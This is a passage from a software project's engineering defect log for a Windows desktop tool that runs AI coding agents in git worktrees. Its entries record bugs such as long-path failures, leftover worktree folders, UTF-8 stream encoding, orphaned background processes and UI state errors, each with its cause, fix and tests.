`removedAs`) instead of forgetting it. A tree gone with no landing is `SESSION_TREE_GONE`, which arms nothing.

**Verify.** `LandedRecordTests` caught the record's own trap while it was written: `Edit` read `All()`, which now
returns standing entries only, so every write dropped every trace; it reads every entry since. The fast halves and
the vitest loop hold the rest (D113's gates paragraph). The git sequences were run by hand against the built library
in a scratch repository: the tidied landing read from its branch with the checkout dirty and on another branch and
its status unchanged, the preview's bound and binary test, `.git` and outside refused, a root inside another
repository answered as no checkout, the squash and clean-up leaving a trace read as on the line, and a pruned commit
said and not guessed. **The trap:** a record that gates what a person may press has to be the one that knows the
state; a path string outlives the tree it named.

## A tidy called a tree it had removed "not removed", and its empty folder stayed for ever (2026-09-30)

**Symptom.** The first real post-merge run, done by hand: after a landing's tidy, the session tree's folder
was left on disk, empty, and could not be deleted ("Permission denied", then "Device or resource busy"),
while git no longer listed it as a working tree. The tidy said the tree stayed.

**Root cause.** `git worktree remove` deletes a tree's files, then deletes its registration *whatever came
of the files*, and exits non-zero when the folder itself would not go. On Windows a folder is held by any
process whose working folder it is — a terminal left in it, a harness that ran there — so git let go of the
tree and left the folder. `RemoveAsync` and the clean-up's removal read the exit code alone: they answered
"git would not remove the tree", skipped deleting the branch their proof had cleared, and nothing ever
looked at the folder again (`trees list` showed it as an unreadable tree).

**Fix.** WSR6 (D109 §5). After a failed `worktree remove`, `LetGoAsync` asks git whether it still counts the
tree as one. If not, the removal is what happened: the branch goes as the proof allowed, an empty folder is
deleted if it can be, and the sentence says plainly that the tree and its branch are gone and the folder is
left, and why. The clean-up's press (`CleanAsync`) deletes every empty folder under the trees home once
nothing holds it, and says so for each. Only an empty folder is ever deleted: one holding anything is named
and left.

**Verify.** Reproduced by hand with git 2.53 on Windows: a native process (`git cat-file --batch`) whose
working folder is the tree makes `worktree remove` exit 255 with the registration gone and the folder empty;
`rmdir` succeeds once the process ends. `TreeLeftoversTests` (the clean-up's retry, no git) passes;
`TreeSyncTests.A_tree_folder_held_open_is_said_plainly_and_the_clean_up_removes_it_once_free` holds the
removal and the retry with that same holder, in the `Process` half, written and not run in the branch.
**The trap:** an exit code is git's verdict on the whole command, and `worktree remove` does two things.
Ask git what state it left, not only whether it complained.

## The long-path test failed in every git worktree, because its depth assumed where the checkout sits (2026-09-30)

**Symptom.** `SessionTreesTests.A_tracked_path_that_fits_the_root_but_not_a_trees_longer_prefix_still_opens`
failed in every subagent's worktree and passed in the main checkout, so every hand-back had to name it
(`docs/2026-09-30-parallel-development-design.md` §1). It failed at its last assertion: the tree held
no deep file.

**Root cause.** The fixture's deep path was a constant, 17 `component` folders, sized so that it fitted
under a repository made in the main checkout's `_fixtures/` and crossed 260 characters under a session
tree. A worktree sits under `.claude/worktrees/<name>/`, 37 characters deeper, so the path crossed the
limit under the fixture repository already. Its own `git add` failed without `core.longpaths`, the test
ignored that exit code, the commit held no deep file, and the tree had nothing to find. The test
measured where the repository sat, not the driver.

**Fix.** MOD8. The test makes its repository and home under a short root of its own (`daoris-lp-*` in
OS temp, as many of this assembly's fixtures are), sizes the deep path from that root (at most 240
characters under it, so 267 to 276 under the tree), and asserts that the fixture's `git add` succeeded,
so a fixture that does not fit says so.

**Verify.** `SessionTreesTests` 14/14 in a worktree whose root is 64 characters, where it failed before.
With the driver's `-c core.longpaths=true` turned off, the test fails on git's *cannot create
directory*, so it still proves the fix it was written for. **The trap:** a fixture sized by a constant
against a limit measures the machine it was written on. Size it from the prefix actually in play.

## `daoris toString` crashed with a stack trace and exit 1 (2026-09-30)

**Symptom.** Found while MOD7 made the CLI's commands a table: `daoris toString` and
`daoris constructor` printed Node's `ERR_INVALID_ARG_TYPE` stack trace and exited 1, the policy code a
build gate reads as "the doctrine is wrong". `daoris __proto__` and `daoris hasOwnProperty` printed a
TypeError's message.

**Root cause.** The dispatcher looked a verb up in a plain object literal (`commands[command]`), which
also answers for the members of `Object.prototype`. `toString` and `constructor` ran as handlers, and
their return (a string, the arguments object) reached `process.exit` in `bin/daoris.mjs`, which threw
outside `runCli`'s catch. REV3 F9 had closed the other road to a stack trace; this one was never an
error, so nothing caught it.

**Fix.** The table is looked up by its own verbs (`COMMANDS.find(...)` in `cli.ts`), so each of these
gets the unknown-command refusal with exit 2. Kept out of the MOD7 refactor commit, which reproduces
the old lookup byte for byte.

**Verification.** `a verb named like a member of Object is an unknown command` in `cli.test.ts`, red on
the object lookup for `toString`, then green for all five names. The published entry
(`node bin/daoris.mjs toString`) exits 2 with one line. Commit `b5cfa46`.

## The usage said *circle* for a workspace, and the one-word test could not see it (2026-09-30)

**Symptom.** Found by MOD7: once each usage line became a string literal of its own, `one-word.test.ts`
failed on `import`'s line, *unless --workspace W names the circle they land in*. D75 §4 made
*workspace* the one word every sentence the CLI prints uses.

**Root cause.** The test reads source files line by line and matches string literals opened and closed
on one line. The usage was one multi-line template literal, so its middle lines carried no quote and
the scan passed over them. That blind spot remains for any other multi-line literal: a TypeScript
template literal, or a C# verbatim or raw string.

**Fix.** The word, in `cli.ts` and the golden usage, as its own commit (`cb644ae`) ahead of the
refactor. MOD7's rows keep one literal per line, so the usage is inside the scan from now on. The scan
itself is unchanged.

**Verification.** The one-word test is green, and it failed on the row before the word changed.


**Symptom.** Found by reading (REV3 modules F4), not on a machine: an install published to a second
folder, or the first one moved, would run on the first install's `data/` (its registry, its quests,
its drivable set) and say nothing. Its own `data/` stayed empty.

**Root cause.** D63 has the install set `DAORIS_HOME` for the account once, so a terminal meets the
same machine. Windows hands the account's variables to every process the person starts, the next
install included, and `InstallHome.Establish` deferred to any `DAORIS_HOME` already in its
environment. That deference existed for a gate's scratch home, and it could not tell one from the
account's.

**Fix (D105).** A process value equal to the account's variable, compared as a path, was inherited:
the install's own `data/` replaces it for this process and everything it spawns. A value that differs,
or any value when the account has none, was named for this start alone and is still respected. The
account's variable is never rewritten. The override rides `HomeEstablished.Overrode`, which makes the
start worth saying, so Settings' *Daoris home* row carries the sentence.

**Verification.** Tests first over temporary folders and a fake environment: the second-install and
moved-install facts were red on the old rule (`Establish` answered null), then green. Removing the
respected branch turned the gate's case red (`A_home_named_for_this_start_alone_is_respected…`).
Modules 390 → 393. No second install was started on a real account.

## A stop threw when a process in the tree was already ending (2026-09-30)

**Symptom.** Seen once in MOD8's serial run of the Process category: `ProtocolChatTests`' cleanup threw
`AggregateException(Win32Exception: Access is denied)` out of `ChatRunner.Dispose`, through
`SessionProcesses.StopAll`.

**Root cause.** `Process.Kill(entireProcessTree: true)` reports a process in the tree that refused access
because it was already exiting as a `Win32Exception` inside an `AggregateException`. `SessionProcesses.Stop`
caught only `InvalidOperationException` (the root gone first), so the aggregate escaped: from a test's
cleanup that day, and from a person's stop the same way on any machine where a session's tree is ending as
they press it. `EndIfRunning` caught the bare `Win32Exception` but not the aggregate either.

**Fix.** Both catch through one rule, `SessionProcesses.Ending`: a root that exited, a process refusing
access mid-exit, or an aggregate made only of those, flattened. Anything else still propagates.

**Verification.** `SessionProcessesTests` holds the rule (the aggregate, a nested one, and the failures it
must not swallow). The kill itself cannot be provoked on demand, so the defect is proven by the rule and
the one sighting, not by a test that reproduces it.

## A plugin's words came back in the console's code page (2026-09-30)

**Symptom.** PLUG8's Try on the window, on a Chinese-locale machine: the GitHub example plugin's
answer read *git push to origin failed 鈥?fatal: …*, its em dash turned into `鈥?`.

**Root cause.** The hook wire's start (`HookProcess.StartInfo`) redirected all three streams and named
no encoding, so .NET read and wrote them in the console's code page (CP936 here). A UTF-8 em dash
(`e2 80 94`) decoded as GBK is `鈥` plus a replacement. The first deployment found exactly this in a
session's transcript and fixed it where the adapters spawn (`Adapters.Shell`), with a comment saying
so. The hook wire and the version probe (`Harnesses.AskAsync`) were written or kept apart from that
spawn, and nothing held the property at every spawn site. Every plugin's non-ASCII words were garbled
on this machine, in the loop as well as in Try: a hold's reason, a landing's sentence, a stderr line.
They went out mangled too, since a quest's 中文 title was written to the plugin the same way.

**Fix.** The hook wire names UTF-8 with no byte-order mark on all three streams, the version probe on
both of its, and the host supervisor's input as well. The source scan that makes every desktop spawn
say `CreateNoWindow` now also makes every redirected stream name its encoding
(`NoConsoleWindowTests.Every_stream_the_desktop_redirects_is_utf8`). It found the supervisor's input,
the one site left.

**Verification.** Test red first:
`HookTests.A_hook_process_speaks_utf8_both_ways_whatever_the_consoles_code_page` read back
`held 鈥?淇浠〃鐩?…` for `held — 修复仪表盘 — ünïcode`, then green. Seen again on the window: Try's
line reads *failed — fatal*. The test expresses the defect only where the console's code page is not
UTF-8, as this machine's is; a Linux gate passes it either way.

## The browser left a task's exception to the finalizer (2026-09-30)

**Symptom.** The owner's first real machine log (LOG2) held one `error` in the `browser` source: `where`
*an unobserved task*, an `AggregateException` wrapping *The remote party closed the WebSocket
connection without completing the close handshake* (a `SocketException` 10054 underneath), written
fifteen seconds before the browser's `app.stopped`, as the application was closed; the host's next
`app.started` ran the CHR8 build.

**Root cause.** The stack's last frame is `Daoris.Desktop.CdpRelay.PumpAsync`: the browser was still
the pre-CHR8 build. `RelaySocketAsync` started two pumps, `await Task.WhenAny(up, down)`, cancelled
the other and returned, observing neither. As the engine shut down it dropped its sockets without a close
frame, the pump reading from it faulted, and only the finalizer ever looked. CHR8 (D99) deleted that relay,
and the browser's own two remaining fire-and-forget tasks had the same shape in a smaller form: the first
window caught a list of exception types and left any other to fault a task nobody held, and the shell
watch caught none.

**Fix.** `MachineLog.Observe(task, where, failed)` in the driver library: a continuation that writes a
failure as the `error` event with its place, runs the reaction, writes that too if it throws, and never
faults. `BrowserProcess` hands both tasks to it; the first window moved to `EngineCdp.FirstWindowAsync`
in the modules, throws whatever went wrong, and turns a client timeout into a `TimeoutException`.

**Verify.** `MachineLogTests`: an observed failed task never reaches `TaskScheduler.UnobservedTaskException`
after forced collections, and the same task unobserved does. `FirstWindowTests`: a stand-in engine that
completes the socket handshake and drops the connection gives one line (`the browser's first window`,
`System.Net.WebSockets.WebSocketException`) and a cancelled stop. A source test fails if `BrowserProcess`
discards a task without `log.Observe(`; it failed on the two it had.

**The trap.** `Task.WhenAny` returns a task; it observes nothing, the winner's exception included. The
kit's relay that replaced Daoris's (Shenora.Chromium 0.18.0) has the same lines, which is a request for
the kit, not a fix here.

## The HTTP host never wrote its own stop (2026-09-30)

**Symptom.** The usage report over the owner's first real machine log (LOG2): the `host` source had an
`app.started` for every start of the application and not one `app.stopped`, while the shell's own
starts and stops paired up.

**Root cause.** `HostSupervisor.Stop` ended the host the shell started with
`Kill(entireProcessTree: true)`. The host's `app.stopped` is written from
`ApplicationStopping`, which a kill never reaches, so the lifetime's whole clean path (Kestrel's drain,
the log line, the log's own close) was skipped on every close. LOG1a added the line and could not see it
missing: the in-process test host is stopped by its factory, which runs the lifetime.

**Fix.** The supervisor starts the host with its standard input redirected and
`DAORIS_STOP_ON_INPUT_END=1` (`HostSupervisor.StartInfo`), and stops it by closing that input, waiting up
to five seconds, and killing only a host still running then. The host (`InputEndStop`, wired on
`ApplicationStarted`) reads its input to the end on a background thread only when the variable asks, and
then calls `StopApplication`. No route: a door to stop the host would be pressable by any caller.

**Verify.** `InputEndStopTests` starts the real `daoris-knowledge-http` with its input redirected and
closes it: exit 0 and `app.stopped` with the uptime (it failed before the host was wired); unasked, the
same close leaves it serving. `HostSupervisorTests` holds a stand-in host that honours the input
(`HostStop.Exited`, failed as `Killed` against the old stop) and one that ignores it (killed after the
bound). By hand: a starter killed outright left its host to see the pipe break and stop cleanly.

**The trap.** A clean-stop hook proves nothing until the thing that stops the process runs it: a test
host stopped by its own harness is not the process the shell stops.

## A question handed to Ask Daoris was asked again by its next drawing (2026-09-30)

**Symptom.** Found building SETUP1b's hand-off, not reported: a question the palette handed Quick Ask
(DOCK1d) would be sent again each time the box opened afterwards, and the setup guide's first message
would have been sent again each time the side bar's Ask Daoris tab was drawn.

**Root cause.** The application held the opening (`{ text, id }`) and never let it go; the
conversation remembered the last id it sent in a ref. The box's content is unmounted when it closes and
the side bar's tab is drawn only while it shows, so each new drawing started with an empty ref and a
held opening, and sent it. DOCK1d's test re-rendered one instance, which the ref covers, and never drew
a second.

**Fix.** The conversation says it sent one (`onOpened`, from its effect, frontend-architecture §4b), and
the application clears the opening; ids come from one counter in the application, so a cleared
opening's id is never handed out again to an instance that remembers it.

**Verify.** `AskDaoris.test.tsx`, *says when it has sent a question it was handed, so a later drawing
does not send it again*: a holder that clears on `onOpened`, drawn, hidden and drawn again, sends once;
it sent twice before the fix. `setupStart.test.tsx` carries the guide's message to the helper over the
whole window. Quick Ask's own wiring (`onOpened` clearing `quickOpening`) is the same line and has no
test of its own over the window.

**The trap.** An event held by a parent outlives the child that consumed it, and a ref is per drawing:
§4b's *tell the parent* is what makes a consumed event stay consumed.

## The desktop did not find an agent npm put on PATH (2026-09-30)

**Symptom.** `claude-code-acp`, installed globally with npm, was listed by `daoris agent list`, and
the desktop held every driven start on it: *not installed on this machine, so there is nothing to
spawn*.

**Root cause.** npm puts `claude-agent-acp.cmd` in the Node folder, with an extensionless POSIX script
beside it. The desktop's probe and both doors' spawns started the bare name, and a process started
without a shell on Windows is found only as an `.exe`; the script found first is no program at all.
So the probe said absent and the selector held. The CLI's `spawnable` and the driver's installer path
(`WindowsShim`, REV3) already resolved the shim; the harness door never asked.

**Fix.** `HarnessProbe.Apply`, the one line the probe and both doors' spawns take (where the pin is
applied too), resolves the file through `WindowsShim`, which uses the plugin door's
`CommandPresence.Resolve` by PATHEXT: an `.exe` wins where both exist, and a name found nowhere is
left as it was, so it is still absent. A shim is held to the rule `cmd.exe` imposes: an argument it
would reinterpret is refused in a sentence. That is the pipe door's prompt, whose line breaks `cmd.exe`
parses as the end of a command; a pinned `.cmd` used to be started with it unchecked. What a real
shim does with such a prompt was not measured: the refusal is the rule `WindowsShim` already kept.

**Verify.** `CommandShimTests` (a `.cmd` beside a script resolves to the `.cmd`; an `.exe` beside it
wins; nowhere stays absent; both doors spawn the shim; the probe finds it; a prompt on a shim is
refused), with `HarnessRunTests` still green.

**The trap.** "Is it on PATH" has three answers on Windows: the name, the name with PATHEXT, and what
can be started. A check that asks one question and a spawn that asks another disagree about the same
file.

## A finished session's console still said live (2026-09-30)

**Symptom.** A chat watched to its end showed `completed` in its head and **live** above its console;
earlier the same day, a stopped task's console did the same beside a tab saying `stopped`.

**Root cause.** An end is never a line, and the page learned liveness only from lines: every batch of
output the relay sent was taken as live. The relay sends a window after the lines were written, so a
session's last lines went out after its console had closed and re-marked it live; a stream's end
reached the page only as its session's streams changing, which refreshed the tabs and not the console.

**Fix.** A batch says whether its console still runs (`SessionOutput.IsLive`, read as the batch goes
out), and the page honours it. A console asks again when its session's ending is told
(`SESSION_ENDED`) or, for a stream, when its session's streams change.

**Verify.** `SessionOutputTests`, `ProtocolChatTests` (the console has ended when the end is told),
`WorkFrame.test.tsx` (a batch that says ended, a session's ending, a stream's), and the scratch window.

**The trap.** A flag set by every message is a flag nothing can clear. Liveness has to travel with the
lines, or the last line always wins.

## The dev loop's `kill` could close the owner's own window (2026-09-30)

**Symptom.** None seen, found reading the path: after `desktop -- run --install`, the loop's record
named the install's application, and the owner's own start of that install, through its launcher, runs
from the same executable. `desktop -- kill` would have closed the window the owner opened.

**Root cause.** `kill` asked which processes run from the recorded path and stopped all of them. That
was right while the scratch build was the only thing on its path; `run --install` made the record name
a path the person uses too.

**Fix.** `kill` stops the pid the loop recorded (`startedHere`), and says nothing is running when that
pid has ended, whoever else runs from the path. A record without a pid keeps the path's answer.

**Verify.**
- `desktop-tool.test.ts`: *kill stops the process the loop recorded, never another from the same path*.
- On the machine: a scratch run stopped by its pid while the installed window, from another path, kept
  running.

**The trap.** A path is an identity only while one thing runs from it. On Chromium it was already
several (the engine's own processes, D93), and an install is always the person's too.

## The Chromium shell said its page was missing, twice (2026-09-30)

**Symptom.** A scratch window on Chromium showed *"The platform's page was not found beside the service
host"*, first naming the host's `bin/` folder, and later `bin/Release/net10.0/win-x64/`.

**Root cause.** On WebView2 the window showed the host's own URL, so where the host found its bundle was
the host's business. `ChromiumView` serves the bundle from a folder, so the shell has to name it
(`DesktopPage.BundleOf`). A development host serves its PROJECT's `wwwroot` through the static assets
manifest, three folders above `bin/Debug/net10.0/`, and a publish leaves a runtime build four above.

**Fix.** The shell walks up from the host's executable to the first `wwwroot` holding a page, four
folders at most, after the host's working directory.

**Verify.** `DesktopPageTests`: a workspace build, a runtime build, an install, and none. On the
window: the Overview rendered on the scratch shell after the Release build became the newest.

**The trap.** The first fix covered the case in front of it. The dev loop takes the newest host build,
and a publish makes a newer one, a folder deeper.

## A parked driven session could be answered only from the top of its record (2026-09-29)

**Symptom.** The owner, reading a parked session's question on the installed window: *"there is no way
I can input the answer"*. The session's last words, at the foot of a record of 1,800 events, asked for
a go-ahead, and nothing near them took one.

**Root cause.** A driven session has no composer: it was handed its whole target at once, so the frame
offers no box. Its answer door (STANDDOWN2) was a button in the waiting card at the very top of the
session, above the conversation. The conversation opens on its last words, where the question is, so
the door was a record's length away from the question it answers.

**Fix.** A parked driven session is answered from a box at the foot, where a chat's composer is: words
only, no attachments, its button *carry on with this answer*. The card above keeps finish, decline and
stop, and says the box below carries it on, which is the chat's pattern: one owner for the answer
(D56). An answer that does not arrive goes back into the box.

**Verify.**
- `WorkFrame.test.tsx`: *answers a parked driven session from the box at the foot, and the card says
  the box carries it on*, posting the words to the session's answer door.
- The owner was told where the old door was, and offered the terminal's `daoris-driver answer`.

**The trap.** A door placed where the design says the question is, not where the screen shows it: the
conversation's own reading order (SESS1 S1, last words in view) moved the question and left the door.

**Commit.** `1d6bedb`

## A parked session filled Overview's band, and nothing said the row was the door (2026-09-29)

**Symptom.** The owner, with the first real session parked for their sign-in: *"it says waiting for
me to signin, I did but no where to reply in session or any place to retrigger"*. The installed
Overview showed the parked session in *what needs you* as a screen of text, its whole analysis, with
no button in sight. The answer door was one press away (the row opens the session in Sessions,
whose waiting card carries *answer and carry on…*), and nothing on the row said so.

**Root cause.** Two. The detail's `line-clamp-2` sat beside `block`, and `block` overrode the
display the clamp needs, so no analysis was ever held to two lines: a short one hid it, and the first
long one filled the band. And a door row said what was waiting and never where it led, so a row that
had stopped looking like a row read as a notice.

**Fix.** No display utility beside the clamp. A row with a door says where it goes, in its accent, by
kind: *open it to answer*, *open the ask to publish it*, *open the rules to answer it*, and so on. A
row with nowhere to go (a browser's parked session) says nothing of the kind, as before. The owner
was unblocked from a terminal first (`daoris-driver answer`).

**Verify.**
- `AttentionRow.test.tsx`: *says where its door goes* and *keeps a long analysis to two lines, with
  nothing overriding the clamp*. Both failed first.
- On the scratch window, both themes: each row carries its verb, and the analyses sit at two lines.

**The trap.** jsdom lays nothing out, so a clamp that clamps nothing passes every test that renders
it. A class that depends on another class's absence needs a test that says so.

**Commit.** `e86a358`

## A session tree past 260 characters could be opened, and not read or removed (2026-09-28)

**Symptom.** Cleaning up the first real workspace's session branches, a forced removal of a discarded
tree failed with *Filename too long*, after git had already let go of the tree. Its folder was left
half deleted and its branch behind. Two other trees were kept by the clean-up for *uncommitted work*
(3 paths each) whose diffs, whitespace and line ends included, showed no change at all.

**Root cause.** A session tree's path is longer than its repository's root, so a file that fits
under the root can pass Windows' 260 characters in a tree. The 2026-09-27 fix gave `core.longpaths`
to the one command that opens a tree (`worktree add`). Every other git call in a tree ran without
it: `worktree remove` could not delete the deep files, and `status` could not read them, so it
reported the three committed files as changed.

**Fix.** `WorkingTree.GitAsync`, the driver's one git runner, says `-c core.longpaths=true` on every
call, and the per-call copies are gone. Said on the command line, so no repository's configuration
changes. The half-deleted folder was removed by hand, since git no longer knew it; its branch held no
commits of its own and went with the clean-up.

**Verify.**
- `SweepTests`: *a tree with paths past 260 characters is removed*, and *a committed file past 260
  characters is not taken for uncommitted work*. Both failed first with the real messages.
- On the real workspace, the rebuilt clean-up listed all eight branches to go, and removed 8 of 8.

**The trap.** Long paths are a property of the location, and a fix at one call site leaves every
other call at that location with the same trap. Say it where every call passes.

**Commit.** `5734758`

## A Settings test failed every full run and passed every time alone (2026-09-28)

**Symptom.** `SettingsView in a browser > lists every workspace…` failed in three full runs of the
web unit suite in a row (the platform gate's first step), showing "0 workspaces". It passed alone, and
beside the stories and shell files.

**Root cause.** Testing-library's `findBy` waits one second. A file's first find waits on its first
fetch through React Query. With 83 files in parallel workers, that took longer than a second once the
suite had grown by a file of stories. It is the class the vite config's `testTimeout` comment names
for typing tests (2026-09-24): time a loaded machine takes, not a defect.

**Fix.** `configure({ asyncUtilTimeout: 5_000 })` in `src/test/setup.tsx`, for the whole suite. A
number per call would be a list someone appends to. A find that never matches still fails, five
seconds later.

**Verify.** With only that find given eight seconds, the full run passed 1219/1219. Then it passed
again with the suite-wide setting and the per-call change reverted.

**Commit.** `a4f3139`

## A tree whose line only origin had was removed as if its work had landed (2026-09-28)

**Symptom.** Found while building WSR2, before it shipped. A repository's line set to `develop`, with
this checkout holding `develop` only as `origin/develop`. A session tree grown from it with a commit
of its own was removed without `--force`, and the answer said it was. Only git's own `branch -d`,
which refused to delete a branch not merged into the checkout's HEAD, kept the commits. The merge door
said "`develop` already holds everything — nothing to merge".

**Root cause.** Both doors asked `git log --oneline <line>..<branch>` and read only its output. With
no local `<line>`, git exits non-zero and prints nothing to stdout, and an empty answer read as
"nothing unmerged". The same flaw was latent before WSR2 whenever git could not compare. The guess
(`origin/HEAD`, else `main`, else `master`) almost always names a local branch, and a line a person
sets need not.

**Fix.** `SessionTrees.ComparableAsync` names the line where git has it: the local branch, else
`origin/<line>`, else nothing. Both doors compare against that name and check git's exit code. A
comparison git cannot make is a refusal that keeps the tree and says why. A line git has nowhere
cannot say whether work landed on it.

**Verify.**
- `CanonicalLineTests`: *work on a line only origin has is not taken for landed*, and *a tree is not
  removed against a line git cannot find*.
- With the exit-code checks off and the comparison back on the bare line name, both went red.

**The trap.** A git call read for its output alone treats a failure as an empty answer. Where empty
means "safe to delete", check the exit code.

**Commit.** `a4f3139`

## The session dock stayed narrow while the window grew (2026-09-28)

**Symptom.** The owner, on the installed window: *"box content does not auto resize with the outer
window so it always stay as a small width"*. Where *accept* is pressed, in the review pane of the
Work frame's right dock. Measured on the scratch shell: the window went from 1518 to 1923 CSS px,
and the dock stayed at 389.

**Root cause.** FRAME6 (`778d3a2`) remembered a dragged dock width in pixels, in `daoris.dockWidth`.
`frameLayout` took that width as it was and clamped it only to the dock's floor, the 70% cap and the
room the session needs. So once a person had dragged the dock at one window size, it kept that size at
every other. An undragged dock was 45% of the window and followed it (865 at 1923), so the defect
showed only after a drag, which is why it read as some windows and not others.

**Fix.** `FramePrefs.dockShare` is the dock's share of the window (`work/layout.ts`), stored in
`daoris.dockShare`. A drag lands as its share of the window it was dragged in. A pixel width left by
an earlier build is read once, as its share of the window it is read in, and then removed. The rail
keeps pixels on purpose: it is a list, bounded to 264–420px.

**Verify.**
- The layout test *keeps a dragged width as a share*, watched failing with the share pinned to one
  window's width.
- Two frame tests: a drag stored as a share that grows with the window, and a pixel width converted
  once.
- On the scratch shell, the old pixel width planted at 1518: 389 there, 493 at 1923.
- The sweep the row asked for, by code and by looking at every main view at 1923: no other container
  holds a width it should not. Each cap left is a reading measure, a form sized to its fields, an
  overlay, or the monitor's sidebar.

**Commit:** `49ece30`.

## A conversation said "working…" under words its agent said after the turn (2026-09-28)

**Symptom.** Looking at CONSOLE2 on a real chat, the turn ended, and then the agent spoke again when
its background ticker finished. The conversation drew those words under a *working…* mark, and the
mark stayed there, with no turn running and the head reading *idle*.

**Root cause.** The agent speaking after its prompt's response is the protocol door's ordinary
behaviour for Claude Code: its background work's completion wakes it (CONSOLE2a). In the record those
words come after the turn's end, so they open a turn of their own that no ask started and no turn
end closes. The view marked the newest open turn as running whenever the session was live, and a
chat is live for as long as its process is.

**Fix.** The view takes whether a turn is in flight where something says so. For a conversation the
driver holds, that is the driver's own answer (`taking`), which the composer's stop already follows.
Anywhere nothing says, a live session's last open turn still reads as running, as before.

**Verification.** Red first: `ConversationView`'s *says working only while a turn is in flight* and
`WorkFrame`'s wiring test, which fails without the frame's change. Then green, with web 1201 and
Playwright 21. On the window: a fresh chat whose ticker finished after its turn shows those words
with no mark.

## Two messages in a row read as one: "DONESubagent finished" (2026-09-28)

**Symptom.** Looking at CONSOLE2's tabs on a real chat over the protocol door, the conversation read
*DONESubagent finished — README.md's first line is …* and, after the turn, *…still running on its own
as instructed.The background ticker finished*. Each pair was two messages the agent sent, glued with
no space.

**Root cause.** The record joins consecutive message chunks into one message, because the wire streams
words. Two messages in a row, with only an update to an existing card between them (a subagent's
ending) or nothing the record keeps (a usage reading), are consecutive chunks too. The wire says
which message each chunk belongs to: every `agent_message_chunk` carries a `messageId`, and Claude
Code's `stream-json` names the message in `message_start` and on the whole `assistant` message. Both
doors dropped it. The console joined them the same way whenever nothing else came between.

**Fix.** Both doors keep the message's id on each message and thought event. The conversation joins
chunks only within one message, and a record written before ids were kept joins as it always did.
The protocol door's console ends its open line when a new message begins.

**Verification.** Red first: `AcpTests.Two_messages_in_a_row_are_two_by_the_ids_the_wire_gives_them`,
`ClaudeStreamJsonTests.A_messages_words_carry_its_id_streamed_or_whole`, and the conversation's
`keeps two messages in a row apart by their ids`. Then green, with driver 799 and web 1199.

## A session's dev servers outlived it, holding two ports and a finished tree (2026-09-27)

**Symptom.** FG5's verify session started its repository's dev servers (`npm run start`: Angular on
4200, Vite on 4288) from its harness's background shell. It ended its turn, and the record
concluded. An hour later both servers were still listening, serving the finished session's tree.
Their parent chain ran bash → npm → `concurrently` → the servers, back to the agent's pid, which no
longer existed. They were stopped by hand, and the person's own dev server would have collided with
them on 4200.

**Root cause.** The driver ends what it tracks: `EndIfRunning`, and a stop, call
`Process.Kill(entireProcessTree: true)`. That walks the tree from a live root. On the ordinary path
the agent exits on its own once its turn ends and stdin closes, so the call finds nothing running.
Whatever the agent started in the background is by then nobody's child, and nothing ever named it.
The reaper has been there since REV3, and the gap has been there as long.

**Fix.** `ProcessJob`: on Windows the spawned harness joins a job object that kills on close, as it
is tracked (`SessionProcesses.Track`). Every process it starts joins the same job, detached or not,
since the job does not allow breaking away. The untrack at the session's end closes the handle and
ends them all, and so does the driver's own exit. It covers every spawn that is tracked: quest
sessions, intakes and conversations. Elsewhere it is a no-op for now, since Windows is where the
defect was measured.

**Verify.** `ProcessJobTests` starts a parent that launches a detached child with a heartbeat and
exits. It asserts the child outlives its parent (the measured shape, and red before the fix on the
next assertion), then that the child stops beating once the session is untracked. Driver 766.
**The general rule:** a supervisor that ends only the process it started has not ended the work.

## An account's limit cut a session off mid-edit, and the record said somebody else had the quest (2026-09-27)

**Symptom.** FG5's development session worked twenty minutes on its quest in its own tree. Its last
lines were the agent's *"You've hit your individual spend limit · … · your session limit resets
7am"* and the driver's own *"— the ACP session failed: the ACP agent refused the call: Internal
error: …"*. The record concluded `stood-down: exited cleanly with the quest taken — someone else has
it`. Nobody else had it. The quest was stranded as taken, its tree held uncommitted edits, and the
one fact the person needed, the account limit, appeared nowhere but the transcript's last line.

**Root cause.** ACP1 (`37cd92e`) wrote down a failed protocol call and kept it out of the conclusion,
on the ground that *"the process still has an exit code"*. On the protocol door that exit code says
little. The driver closes stdin when the turn ends, for whatever reason it ended, and the agent then
winds up and exits 0. So a turn the agent refused concluded as a clean exit, and a clean exit with
the quest taken is the stand-down shape. The intake had the same hole with a worse sentence: a
refused intake that had published nothing would park as *"asking you"*.

**Fix.** The door's failure travels to the conclusion beside the exit code and the quest's state.
`CaptureAcpAsync` returns it, `HoldAsync` hands it to both conclusions, and `Observation.Conclude` and
`IntakeObservation.Conclude` read it: a refused turn with the quest still taken or open, or an intake
that published nothing, concludes `failed` in the agent's words. A close, a wait or a publish that
landed before the refusal keeps its ending. It is not the self-report D46 §4 keeps out: the session
is not describing its work, the door is saying the work was cut off.

**Verify.** `AcpTurnFailureTickTests` runs a real tick over the protocol door with a stand-in agent
that takes its quest and then answers `session/prompt` with the measured error. The record is
`failed`, naming the spend limit. `ObservationTests` and `IntakeTests` hold the endings that stand.
Driver 758, family rehearsal.

**Not repaired here:** the stranded quest on the owner's install. Whether to decline and re-ask or
carry it on by hand in its tree is the owner's call (TASKS, FG5). **The general rule:** on a door
whose exit is the driver's own doing, the exit is not evidence of how the work went.

## A session tree could not open past Windows' path limit, left a branch on every tick, and quoted git's progress line (2026-09-27)

**Symptom.** The first real ticket on the first real workspace (FG5). The intake read the ticket
through the in-app browser and published a quest to a repository with own trees on. The quest then
sat, and its reason was *"could not open a session tree for `…` — git said: Preparing worktree (new
branch 'daoris/s-…')"*. That sentence says nothing about why. Meanwhile the repository had gained a
`daoris/s-*` branch on every tick: sixteen, each at the root's HEAD with no commits, before the
repository was held.

**Root cause.** Three things, one line each in `SessionTrees.OpenAsync` since SURF3 (`476a8a0`):
- **The limit.** A tree lives at `<home>/trees/<workspace>/<repository>/s-xxxxxxxx`, which is longer
  than the repository's own root. Its deepest tracked file (207 characters) fitted under the root
  and crossed 260 under the tree. Without `core.longpaths`, Git for Windows fails the checkout:
  *"fatal: cannot create directory at '…': Filename too long"*, exit 128. The fixture repositories
  were shallow, so no test crossed it.
- **The branch.** `worktree add -b` creates the branch before it checks anything out. A failed
  checkout removes the half-made tree and keeps the branch. The failure comes before any session
  record exists, so it costs no strike, and the next tick tried again with a new name.
- **The message.** The refusal quoted the first line of stderr, and git's first line is its
  progress, not its reason.

**Fix.** `git -c core.longpaths=true worktree add …`, for that one command, so nothing in the
repository's configuration changes. On failure, `git branch -D` the branch that same call made a
moment ago under a fresh name, which leaves the repository as it was found. The refusal quotes the
last `fatal:` line, then the last `error:` line, then the last line.

**Verify.** Reproduced first in a scratch repository: a 196-character path under a deep tree prefix
